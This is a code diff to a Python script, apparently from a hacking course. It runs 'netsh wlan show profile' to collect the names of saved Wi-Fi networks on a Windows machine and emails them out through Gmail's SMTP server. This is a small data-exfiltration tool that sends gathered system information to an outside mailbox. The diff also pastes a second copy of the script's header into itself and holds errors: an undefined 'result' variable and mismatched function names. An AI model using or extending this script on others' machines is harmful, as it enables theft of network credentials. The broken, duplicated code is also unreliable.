@@ -4,6 +4,38 @@ import subprocess, smtplib, re
 
 def send_email(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587) #creates instance of an SMTP server using SMTP lib
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    #(from_addr, to_addr, message)
+    server.quit()
+    
+email = input("Enter email address to send to: ")
+password = input("Enter email password: ")
+
+command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
+
+networks = subprocess.check_output(command, shell=True)
+#network_names = re.search("(?:Profile\s*:\s) (.*)", networks)
+# \s regex to search for blank space, * specifies any number of blank spaces
+# ( second group - . -any char, * - any number of ocurrences
+# ?: - non-capturing group
+
+network_names = re.findall("(?:Profile\s*:\s) (.*)", networks)
+#findall is an RE that will return any instances of the text specified and place in list
+
+print(network_names)
+
+send_email(email, password, result)
+#no hardcoded creds to see here, move along creeps
+
+#===============================================================================================
+#!/usr/bin/env python
+
+import subprocess, smtplib, re
+
+def send_email(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587) #creates instance of an SMTP server using SMTP lib
     #using gmail's SMPT server on port 587
     #need to enable Less secure app access in Google account settings if using Gmail
     #https://myaccount.google.com/security
@@ -41,3 +73,4 @@ print(network_names)
 send_mail(email, password, result)
 #no hardcoded creds to see here, move along creeps
 #subprocess.Popen(command, shell=True)
+
